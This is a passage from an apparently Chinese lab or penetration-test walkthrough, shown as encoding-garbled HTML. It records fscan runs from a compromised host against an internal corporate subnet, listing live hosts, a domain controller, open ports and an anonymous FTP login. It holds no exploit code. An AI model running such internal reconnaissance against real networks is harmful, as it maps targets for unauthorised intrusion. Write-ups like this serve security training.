        RX packets <span class="token number">13188</span>  bytes <span class="token number">1615163</span> <span class="token punctuation">(</span><span class="token number">1.6</span> MB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">15242</span>  bytes <span class="token number">2310239</span> <span class="token punctuation">(</span><span class="token number">2.3</span> MB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">&gt;</span>  mtu <span class="token number">65536</span>
        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0
        inet6 ::1  prefixlen <span class="token number">128</span>  scopeid 0x1<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>host<span class="token operator">&gt;</span>
        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>
        RX packets <span class="token number">51086</span>  bytes <span class="token number">4182773</span> <span class="token punctuation">(</span><span class="token number">4.1</span> MB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">51086</span>  bytes <span class="token number">4182773</span> <span class="token punctuation">(</span><span class="token number">4.1</span> MB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

veth5a67c36: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet6 fe80::5471:18ff:fe4d:6e43  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
        ether <span class="token number">56</span>:71:18:4d:6e:43  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">16073</span>  bytes <span class="token number">1083423</span> <span class="token punctuation">(</span><span class="token number">1.0</span> MB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">23215</span>  bytes <span class="token number">415331110</span> <span class="token punctuation">(</span><span class="token number">415.3</span> MB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></code></pre>

<p>æ‰«æäºŒå±‚å†…ç½‘å¯¹åº”ç½‘æ®µ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Ollama:~<span class="token comment"># ./FScan_2.0.1_linux_x64 -h 172.22.20.0/24</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     CIDRèŒƒå›´: <span class="token number">172.22</span>.20.0-172.22.20.255
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     generate_ip_range_full
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     è§£æCIDR <span class="token number">172.22</span>.20.0/24 -<span class="token operator">&gt;</span> IPèŒƒå›´ <span class="token number">172.22</span>.20.0-172.22.20.255
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">256</span>
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.20.11    å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.20.165   å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.20.25    å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.20.253   å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.20.38    å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">3</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.20.32    å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">6</span>.4s<span class="token punctuation">]</span>     å­˜æ´»ä¸»æœºæ•°é‡: <span class="token number">6</span>
<span class="token punctuation">[</span><span class="token number">9</span>.6s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.32
ä¸»æœºå: FPSRVFS02
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.32             
<span class="token punctuation">[</span><span class="token number">9</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.25
ä¸»æœºå: FPSRVAD01
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.25
<span class="token punctuation">[</span><span class="token number">9</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.165
ä¸»æœºå: FPSRVIIS03-2
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.165
<span class="token punctuation">[</span><span class="token number">9</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.38
ä¸»æœºå: FPSRVIIS03
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.38
<span class="token punctuation">[</span><span class="token number">9</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.32    FPCORP<span class="token punctuation">\</span>FPSRVFS02 
<span class="token punctuation">[</span><span class="token number">9</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.25    DC:FPCORP<span class="token punctuation">\</span>FPSRVAD01
<span class="token punctuation">[</span><span class="token number">9</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.165   FPCORP<span class="token punctuation">\</span>FPSRVIIS03-2
<span class="token punctuation">[</span><span class="token number">9</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.38    FPCORP<span class="token punctuation">\</span>FPSRVIIS03</code></pre>

<p>FPSRVIIS03ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Ollama:~<span class="token comment"># ./FScan_2.0.1_linux_x64 -h 172.22.20.38 -p 1-65535</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">65535</span>
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:445
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:80
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:139
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:135
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:21
<span class="token punctuation">[</span><span class="token number">7</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:3389
<span class="token punctuation">[</span><span class="token number">10</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:5357
<span class="token punctuation">[</span><span class="token number">10</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:5985
<span class="token punctuation">[</span><span class="token number">13</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:8080
<span class="token punctuation">[</span><span class="token number">13</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:8172
<span class="token punctuation">[</span><span class="token number">38</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:47001
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49669
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49668
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49666
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49667
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49664
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49665
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49673
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49672
<span class="token punctuation">[</span><span class="token number">39</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.38:49671
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">20</span> ä¸ªå¼€æ”¾ç«¯å£
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">20</span>
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ
<span class="token punctuation">[</span><span class="token number">48</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.20.38       çŠ¶æ€ç :404 é•¿åº¦:315    æ ‡é¢˜:Not Found
<span class="token punctuation">[</span><span class="token number">48</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.38
ä¸»æœºå: FPSRVIIS03
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.38
<span class="token punctuation">[</span><span class="token number">48</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.38    FPCORP<span class="token punctuation">\</span>FPSRVIIS03             
<span class="token punctuation">[</span><span class="token number">48</span>.3s<span class="token punctuation">]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª
<span class="token punctuation">[</span><span class="token number">48</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> FTPæœåŠ¡ <span class="token number">172.22</span>.20.38:21 åŒ¿åç™»å½•æˆåŠŸ<span class="token operator">!</span>
<span class="token punctuation">[</span><span class="token number">48</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.20.38:8080  çŠ¶æ€ç :200 é•¿åº¦:5078   æ ‡é¢˜:IntraFetch
<span class="token punctuation">[</span><span class="token number">48</span>.3s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ https://172.22.20.38:8172 çŠ¶æ€ç :404 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜
<span class="token punctuation">[</span>1m11s<span class="token punctuation">]</span>     æ‰«æå·²å®Œæˆ: <span class="token number">16</span>/16</code></pre>

<p>FPSRVII<span class="hexo-wm">sâ€‹Â³ğ¯ğ˜¦ğ’Â·â€â€‹sï½‰â€‹tğï»¿ï»¿</span>S03-2ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Ollama:~<span class="token comment"># ./FScan_2.0.1_linux_x64 -h 172.22.20.165 -p 1-65535</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">65535</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:445
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:139
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:135
<span class="token punctuation">[</span><span class="token number">7</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:3389
<span class="token punctuation">[</span><span class="token number">9</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:5040
<span class="token punctuation">[</span><span class="token number">10</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:5357
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49664
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49665
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49666
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49667
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49669
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49670
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49671
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49672
<span class="token punctuation">[</span><span class="token number">39</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.20.165:49673
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">15</span> ä¸ªå¼€æ”¾ç«¯å£
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">15</span>
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.20.165   FPCORP<span class="token punctuation">\</span>FPSRVIIS03-2           
<span class="token punctuation">[</span><span class="token number">48</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.20.165
ä¸»æœºå: FPSRVIIS03-2
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.20.165
<span class="token punctuation">[</span><span class="token number">57</span>.5s<span class="token punctuation">]</span>     æ‰«æå·²å®Œæˆ: <span class="token number">7</span>/7</code></pre>

<p>FPSRVFS02ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Ollama:~<span class="token comment"># ./FScan_2.0.1_linux_x64 -h 172.22.20.32 -p 1-65535</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
